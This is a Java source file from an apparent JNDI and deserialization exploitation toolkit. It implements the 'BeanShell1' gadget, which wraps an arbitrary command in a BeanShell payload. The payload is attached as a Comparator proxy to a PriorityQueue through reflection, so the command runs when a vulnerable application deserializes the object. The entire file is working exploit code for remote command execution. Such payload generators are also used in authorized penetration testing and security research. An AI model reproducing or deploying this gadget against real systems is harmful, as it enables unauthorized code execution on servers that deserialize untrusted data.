package com.qi4l.jndi.gadgets;

import bsh.Interpreter;
import bsh.XThis;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.beanshell.BeanShellUtil;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.beanshell:bsh:2.0b5"})
@Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
public class BeanShell1 implements ObjectPayload<PriorityQueue> {

    public PriorityQueue getObject(String command) throws Exception {
        String      payload = BeanShellUtil.makeBeanShellPayload(command);
        Interpreter i       = new Interpreter();
        i.eval(payload);
        XThis                      xt            = new XThis(i.getNameSpace(), i);
        InvocationHandler          handler       = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);
        Comparator<? super Object> comparator    = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, handler);
        PriorityQueue<Object>      priorityQueue = new PriorityQueue(2, comparator);
        Object[]                   queue         = {Integer.valueOf(1), Integer.valueOf(1)};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", Integer.valueOf(2));
        return priorityQueue;
    }
}
